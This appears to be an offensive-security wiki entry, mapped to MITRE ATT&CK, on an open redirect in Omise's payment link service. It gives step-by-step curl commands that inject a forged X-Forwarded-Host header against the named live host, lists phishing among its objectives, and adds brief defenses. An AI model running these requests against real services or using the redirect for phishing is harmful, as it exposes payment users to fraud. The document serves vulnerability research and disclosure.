---
tags:
  - open-redirect
  - x-forwarded-host
  - header-manipulation
  - phishing
type: procedure
tools:
  - '[[tools/Burp-Suite]]'
tactics:
  - '[[Initial Access]]'
commands:
  - '[[commands/curl-modify-headers]]'
verified: false
platforms:
  - Web
submitted: true
created_at: '2023-10-01T00:00:00Z'
techniques:
  - '[[Exploit Public-Facing Application]]'
  - '[[Drive-by Compromise]]'
updated_at: '2025-12-14T17:24:31.578Z'
skill_level: intermediate
impact_level: low
detection_risk: low
sub_techniques: []
id: 59f3d48f-2e4f-4071-91c7-7b4d37e1b312
validated: true
mitre_tactics:
  - '[[Initial Access]]'
mitre_techniques:
  - '[[Exploit Public-Facing Application]]'
  - '[[Drive-by Compromise]]'
---
# Manipulate-X-Forwarded-Host-for-Open-Redirect

## Summary

This procedure exploits an open redirect vulnerability in web services like Omise's payment link by manipulating the X-Forwarded-Host HTTP header, allowing attackers to redirect users to arbitrary malicious websites for phishing or social engineering without proper header validation.

## Description

The vulnerability arises from improper sanitization of the X-Forwarded-Host header by load balancers or backend servers, enabling attackers to influence redirect locations. Discovered in Omise's https://link.omise.co/ service, this allows low-severity impacts such as phishing by tricking users into visiting attacker-controlled sites. The attack requires intercepting and modifying HTTP requests, typically using a proxy tool, and can be reproduced by injecting a custom host value like 'example.com' to force redirects.

## Requirements

1. Access to a proxy tool like Burp Suite for request interception and modification
2. Network connectivity to the target URL (https://link.omise.co/)
3. Basic knowledge of HTTP headers and redirect mechanisms

## Defense

Defensive measures and detection strategies:

- Validate and sanitize X-Forwarded-Host headers against trusted sources only
- Implement strict redirect policies using whitelists for allowed domains
- Monitor for anomalous header values in logs and use WAF rules to block manipulations

## Objectives

1. Redirect users to a malicious site controlled by the attacker
2. Facilitate phishing by mimicking legitimate payment flows
3. Demonstrate vulnerability for reporting and remediation

## Instructions

### Step 1: Access and Capture Initial Request

**Context**: Load the target site to generate the base HTTP GET request for modification.

**Command** ([[commands/curl-modify-headers]]):
```bash
curl -v https://link.omise.co/ -H "Host: link.omise.co"
```

> This command fetches the initial response and displays verbose output, including headers. Use a proxy like Burp to intercept instead of direct curl for easier editing.

### Step 2: Modify the X-Forwarded-Host Header

**Context**: Add the malicious header to override the redirect target.

**Command** ([[commands/curl-modify-headers]]):
```bash
curl -v https://link.omise.co/ -H "Host: link.omise.co" -H "X-Forwarded-Host: example.com"
```

> Execute this to send the tampered request. The server processes the X-Forwarded-Host, leading to a redirect to http://example.com. Verify the Location header in the response.

### Step 3: Observe and Validate Redirect

**Context**: Confirm the exploit by checking the redirect behavior.

**Command** ([[commands/curl-modify-headers]]):
```bash
curl -v -L https://link.omise.co/ -H "Host: link.omise.co" -H "X-Forwarded-Host: example.com"
```

> The -L flag follows redirects. Expected output shows a 302 response with Location: http://example.com, confirming the open redirect.

## MITRE ATT&CK Mapping

### Tactics

- [[Initial Access]]

### Techniques

- [[Exploit Public-Facing Application]]
- [[Drive-by Compromise]]

### Sub-Techniques


## Commands Used

- [[commands/curl-modify-headers]]

## Tools Used

- [[tools/Burp-Suite]]

## Tags

- open-redirect
- x-forwarded-host
- web
- phishing
